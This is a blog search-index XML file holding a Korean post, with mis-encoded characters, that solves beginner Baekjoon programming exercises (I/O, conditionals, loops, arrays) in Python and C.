<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BAEğ˜’JOON Write Up</title>
      <link href="2021/05/09/2021-05-11-Alogirithem/"/>
      <url>2021/05/09/2021-05-11-Alogirithem/</url>
      
        <content type="html"><![CDATA[<p>ìš”ì¦˜ ë¡¤, ë„·í”Œë¦­ìŠ¤, ì›¹í•´í‚¹ ê³µë¶€ë§Œ ìˆœí™˜ìœ¼ë¡œ ëŒë¦¬ë‹¤ ë³´ë‹ˆ ì¡°ê¸ˆ ì§€ë£¨í•´ì„œ ì²˜ìŒìœ¼ë¡œ ë°±ì¤€ì„ í’€ì–´ë³´ê¸°ë¡œ í–ˆë‹¤. ì•Œê³ ë¦¬ì¦˜ ê³µë¶€ë¥¼ í•œ ì ì´ ì—†ì–´ ë§¤ìš° í™”ê°€ ë‚œë‹¤. ì‹œê°„ ë³µì¡ë„ì™€ ê°™ì€ ê²ƒë“¤ì„ ê¹ê¹í•˜ê²Œ ë§¥ì´ëŠ” ê±° ê°™ì•„ì„œ ë§ëŠ” ì•Œê³ ë¦¬ì¦˜ì„ ì§œë„ ì •ë‹µ ì²˜ë¦¬ë¥¼ ì˜ í•´ì£¼ì§€ ì•ŠëŠ”ë‹¤. ì¬ë¯¸ëŠ” ì›¹ í•´í‚¹ ë¯¸ë§Œ ì¡ì´ë‹¤.</p><hr><h1 id="Input-and-Output-and-arithmetic-operations"><a href="#Input-and-Output-and-arithmetic-operations" class="headerlink" title="Input and Output and arithmetic operations"></a>Input and Output and arithmetic operations</h1><blockquote><p>Stage 1<br><br> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&#x27;Hello World!&#x27;</span>)</span><br></pre></td></tr></table></figure><br>Stage 2<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&#x27;ê°•í•œì¹œêµ¬ ëŒ€í•œìœ¡êµ°\nê°•í•œì¹œêµ¬ ëŒ€í•œìœ¡êµ°&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Stage 3<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&#x27;\    /\\&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27; )  ( \&#x27;)&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;(  /  )&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27; \(__)|&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Stage 4<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&#x27;|\_/|&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;|q p|   /&#125;&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;( 0 )&quot;&quot;&quot;\\&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;|&quot;^&quot;`    |&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;||_/=\\\\__|&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Stage 5<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">print(<span class="built_in">int</span>(n[<span class="number">0</span>]) + <span class="built_in">int</span>(n[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">print(<span class="built_in">int</span>(n[<span class="number">0</span>]) - <span class="built_in">int</span>(n[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">print(<span class="built_in">int</span>(n[<span class="number">0</span>]) * <span class="built_in">int</span>(n[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">print(<span class="built_in">int</span>(n[<span class="number">0</span>]) / <span class="built_in">int</span>(n[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><blockquote><p>Stage 6<br></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ì™ ì§€ ëª¨ë¥´ê² ëŠ”ë° íŒŒì´ì¬ìœ¼ë¡œ ì§œë‹ˆ ìê¾¸ í‹€ë ¸ë‹¤ê³  í•œë‹¤.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a, b, c;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;a, &amp;b, &amp;c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (a+b)%c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (a%c + b%c)%c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (a*b)%c);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (a%c * b%c)%c);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Stage 7<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">p = <span class="built_in">input</span>()</span><br><span class="line">result = []</span><br><span class="line"></span><br><span class="line">result.append(n * <span class="built_in">int</span>(p[<span class="number">2</span>]))</span><br><span class="line">result.append(n * <span class="built_in">int</span>(p[<span class="number">1</span>]))</span><br><span class="line">result.append(n * <span class="built_in">int</span>(p[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">print(result[<span class="number">0</span>])</span><br><span class="line">print(result[<span class="number">1</span>])</span><br><span class="line">print(result[<span class="number">2</span>])</span><br><span class="line">print(result[<span class="number">0</span>] + (result[<span class="number">1</span>]*<span class="number">10</span>) + (result[<span class="number">2</span>]*<span class="number">100</span>))</span><br></pre></td></tr></table></figure><hr><h1 id="If-Statement"><a href="#If-Statement" class="headerlink" title="If Statement"></a>If Statement</h1><blockquote><p>Stage 1<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(n[<span class="number">0</span>]) &gt; <span class="built_in">int</span>(n[<span class="number">1</span>]):</span><br><span class="line">    print(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">int</span>(n[<span class="number">0</span>]) &lt; <span class="built_in">int</span>(n[<span class="number">1</span>]):</span><br><span class="line">    print(<span class="string">&#x27;&lt;&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">int</span>(n[<span class="number">0</span>]) == <span class="built_in">int</span>(n[<span class="number">1</span>]):</span><br><span class="line">    print(<span class="string">&#x27;==&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Stage 2<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">score = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">90</span> &lt;= score &lt;= <span class="number">100</span>:</span><br><span class="line">    print(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">80</span> &lt;= score &lt;= <span class="number">89</span>:</span><br><span class="line">    print(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">70</span> &lt;= score &lt;= <span class="number">79</span>:</span><br><span class="line">    print(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> <span class="number">60</span> &lt;= score &lt;= <span class="number">69</span>:</span><br><span class="line">    print(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;F&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Stage 3<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">year = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (year % <span class="number">4</span> == <span class="number">0</span>) <span class="keyword">and</span> ((year % <span class="number">100</span> != <span class="number">0</span>) <span class="keyword">or</span> (year % <span class="number">400</span> == <span class="number">0</span>)):</span><br><span class="line">    print(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Stage 4<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">q = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> p &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">if</span> q &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> q &gt; <span class="number">0</span>:</span><br><span class="line">        print(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Stage 5<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">time = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)))</span><br><span class="line">h = time[<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> <span class="number">24</span> <span class="keyword">or</span> time[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (time[<span class="number">1</span>] - <span class="number">45</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">    p = time[<span class="number">1</span>] - <span class="number">45</span></span><br><span class="line">    print(h, p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = <span class="number">60</span> - (<span class="built_in">abs</span>(time[<span class="number">1</span>] - <span class="number">45</span>))</span><br><span class="line">    print(h - <span class="number">1</span>, p)</span><br></pre></td></tr></table></figure><hr><h1 id="For-Statement"><a href="#For-Statement" class="headerlink" title="For Statement"></a>For Statement</h1><blockquote><p>Stage 1<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    print(<span class="string">&quot;&#123;&#125; * &#123;&#125; = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(N, i + <span class="number">1</span>, N * (i + <span class="number">1</span>)))</span><br></pre></td></tr></table></figure><blockquote><p>Stage 2<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">    n = <span class="built_in">input</span>().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    print(<span class="built_in">int</span>(n[<span class="number">0</span>]) + <span class="built_in">int</span>(n[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><blockquote><p>Stage 3<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">result = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">    result += i + <span class="number">1</span></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><blockquote><p>Stage 4<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">count = <span class="built_in">int</span>(sys.stdin.readline().rstrip())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">    n = sys.stdin.readline().rstrip().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    print(<span class="built_in">int</span>(n[<span class="number">0</span>]) + <span class="built_in">int</span>(n[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><blockquote><p>Stage 5<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">count = <span class="built_in">int</span>(sys.stdin.readline().rstrip())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">    print(i + <span class="number">1</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Stage 6<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure><blockquote><p>Stage 7<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">count = <span class="built_in">int</span>(sys.stdin.readline().rstrip())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">    n = sys.stdin.readline().rstrip().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;Case #&#123;&#125;: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>, <span class="built_in">int</span>(n[<span class="number">0</span>]) + <span class="built_in">int</span>(n[<span class="number">1</span>])))</span><br></pre></td></tr></table></figure><blockquote><p>Stage 8<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">count = <span class="built_in">int</span>(sys.stdin.readline().rstrip())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">    n = sys.stdin.readline().rstrip().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    print(<span class="string">&quot;Case #&#123;&#125;: &#123;&#125; + &#123;&#125; = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>, n[<span class="number">0</span>], n[<span class="number">1</span>], <span class="built_in">int</span>(n[<span class="number">0</span>]) + <span class="built_in">int</span>(n[<span class="number">1</span>])))</span><br></pre></td></tr></table></figure><blockquote><p>Stage 9<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">count = <span class="built_in">int</span>(sys.stdin.readline().rstrip())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">    print(<span class="string">&#x27;*&#x27;</span> * (i+<span class="number">1</span>))</span><br></pre></td></tr></table></figure><blockquote><p>Stage 10<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">count = <span class="built_in">int</span>(sys.stdin.readline().rstrip())</span><br><span class="line">j = <span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    print(<span class="string">&#x27; &#x27;</span>*(i-<span class="number">1</span>) + <span class="string">&#x27;*&#x27;</span> * (<span class="number">5</span> - j))</span><br><span class="line">    j = j - <span class="number">1</span></span><br></pre></td></tr></table></figure><blockquote><p>Stage 11<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">N, X = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">A = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> A:</span><br><span class="line">    <span class="keyword">if</span> i &lt; X:</span><br><span class="line">        print(i, end=<span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure><hr><h1 id="While-Statement"><a href="#While-Statement" class="headerlink" title="While Statement"></a>While Statement</h1><blockquote><p>Stage 1<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    A, B = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">    <span class="keyword">if</span>(A == <span class="number">0</span> <span class="keyword">and</span> B == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(A + B)</span><br></pre></td></tr></table></figure><blockquote><p>Stage 2<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        A, B = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">        print(A + B)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><blockquote><p>Stage 3<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="built_in">input</span>()</span><br><span class="line">cycle = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="number">99</span> &gt;= <span class="built_in">int</span>(n) &gt;= <span class="number">10</span>:</span><br><span class="line">    f = n</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        p = <span class="built_in">str</span>(<span class="built_in">int</span>(n[<span class="number">0</span>]) + <span class="built_in">int</span>(n[<span class="number">1</span>]))</span><br><span class="line">        n = n[<span class="number">1</span>] + p[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> n == f:</span><br><span class="line">            print(cycle)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cycle = cycle + <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> <span class="number">0</span> &lt;= <span class="built_in">int</span>(n) &lt; <span class="number">10</span>:</span><br><span class="line">    n = <span class="string">&#x27;0&#x27;</span> + n</span><br><span class="line">    f = n</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        p = <span class="built_in">str</span>(<span class="built_in">int</span>(n[<span class="number">0</span>]) + <span class="built_in">int</span>(n[<span class="number">1</span>]))</span><br><span class="line">        n = n[<span class="number">1</span>] + p[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> n == f:</span><br><span class="line">            print(cycle)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cycle = cycle + <span class="number">1</span></span><br></pre></td></tr></table></figure><hr><h1 id="1-dimensional-array"><a href="#1-dimensional-array" class="headerlink" title="1-dimensional array"></a>1-dimensional array</h1><blockquote><p>Stage 1<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">p = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line"></span><br><span class="line">minn, maxn = p[<span class="number">0</span>], p[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">    <span class="keyword">if</span> minn &gt; p[j]:</span><br><span class="line">        minn = p[j]</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> maxn &lt; p[j]:</span><br><span class="line">        maxn = p[j]</span><br><span class="line">        </span><br><span class="line">print(minn, maxn)</span><br></pre></td></tr></table></figure><blockquote><p>Stage 2<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sollution 1</span></span><br><span class="line">number_arr = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    number_arr.append(<span class="built_in">int</span>(<span class="built_in">input</span>()))</span><br><span class="line"></span><br><span class="line">max_value = number_arr[<span class="number">0</span>]</span><br><span class="line">max_value_index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(number_arr)):</span><br><span class="line">    <span class="keyword">if</span> max_value &lt; number_arr[i]:</span><br><span class="line">        max_value = number_arr[i]</span><br><span class="line">        max_value_index = i + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">print(max_value)</span><br><span class="line">print(max_value_index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sollution 2</span></span><br><span class="line">number_arr = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    number_arr.append(<span class="built_in">int</span>(<span class="built_in">input</span>()))</span><br><span class="line">        </span><br><span class="line">print(<span class="built_in">max</span>(number_arr))</span><br><span class="line">print(number_arr.index(<span class="built_in">max</span>(number_arr))+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Stage 3<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sollution 1</span></span><br><span class="line">num1 = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">num2 = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">num3 = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">result = <span class="built_in">str</span>(num1 * num2 * num3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    print(result.count(<span class="built_in">str</span>(i)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sollution 2</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">number = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, sys.stdin.readline().rstrip().split()))</span><br><span class="line">result = <span class="built_in">str</span>(number[<span class="number">0</span>] * number[<span class="number">1</span>] * number[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    print(result.count(<span class="built_in">str</span>(i)))</span><br></pre></td></tr></table></figure><blockquote><p>Stage 4<br></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span 